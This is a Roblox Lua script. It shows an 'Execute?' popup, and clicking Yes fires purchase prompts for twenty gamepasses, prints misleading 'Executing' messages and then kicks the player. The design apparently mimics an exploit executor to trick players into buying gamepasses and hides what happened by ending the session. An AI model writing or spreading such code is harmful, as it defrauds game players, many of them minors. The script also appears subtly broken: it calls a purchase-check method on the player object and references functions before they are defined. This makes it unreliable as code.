local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

-- Gamepass IDs (replace these with the actual gamepass IDs)
local gamePassIds = {986145840, 987293017, 985608225, 987227192, 986099972, 987335034, 985828082, 985717998, 987636327, 987486394, 985714121, 986332291, 987929946, 985883998, 986153764, 986236936, 985792007, 985740009, 987311057, 986340332}  -- List of gamepass IDs
local uiFrame = nil

-- Create a simple UI with "Yes" and "No" buttons
local function createDecisionUI()
    -- Create the ScreenGui and Frame
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player:WaitForChild("PlayerGui")
    
    uiFrame = Instance.new("Frame")
    uiFrame.Parent = screenGui
    uiFrame.Size = UDim2.new(0.3, 0, 0.2, 0)
    uiFrame.Position = UDim2.new(0.35, 0, 0.4, 0)
    uiFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    
    -- Add question label
    local questionLabel = Instance.new("TextLabel")
    questionLabel.Parent = uiFrame
    questionLabel.Size = UDim2.new(1, 0, 0.4, 0)
    questionLabel.Position = UDim2.new(0, 0, 0, 0)
    questionLabel.Text = "Execute?"
    questionLabel.TextSize = 24
    questionLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    questionLabel.BackgroundTransparency = 1
    
    -- Add "Yes" button
    local yesButton = Instance.new("TextButton")
    yesButton.Parent = uiFrame
    yesButton.Size = UDim2.new(0.4, 0, 0.3, 0)
    yesButton.Position = UDim2.new(0.1, 0, 0.5, 0)
    yesButton.Text = "Yes"
    yesButton.TextSize = 20
    yesButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    
    -- Add "No" button
    local noButton = Instance.new("TextButton")
    noButton.Parent = uiFrame
    noButton.Size = UDim2.new(0.4, 0, 0.3, 0)
    noButton.Position = UDim2.new(0.5, 0, 0.5, 0)
    noButton.Text = "No"
    noButton.TextSize = 20
    noButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    
    -- Button click logic
    yesButton.MouseButton1Click:Connect(function()
        -- When "Yes" is clicked, attempt to buy the gamepasses
        buyGamepasses()
        screenGui:Destroy()  -- Destroy UI after action
        kickPlayerWithMessage()  -- Kick player with message
    end)
    
    noButton.MouseButton1Click:Connect(function()
        -- When "No" is clicked, just close the UI
        screenGui:Destroy()  -- Destroy UI after cancel
    end)
end

-- Function to buy all available gamepasses or the highest one the player can afford
local function buyGamepasses()
    -- Iterate over all the gamepass IDs
    for _, gamePassId in ipairs(gamePassIds) do
        local hasGamePass = player:HasGamePassAsync(gamePassId)
        
        if not hasGamePass then
            print("Executing:", gamePassId)
            -- Prompt the player to buy the gamepass
            MarketplaceService:PromptGamePassPurchase(player, gamePassId)
        else
            print("Execution Failed:", gamePassId)
        end
    end
end

-- Function to kick the player with a message
local function kickPlayerWithMessage()
    -- Kick the player and display a message
    player:Kick("You have been kicked from this experience.")
end

-- Trigger the UI when the game starts or when needed
createDecisionUI()
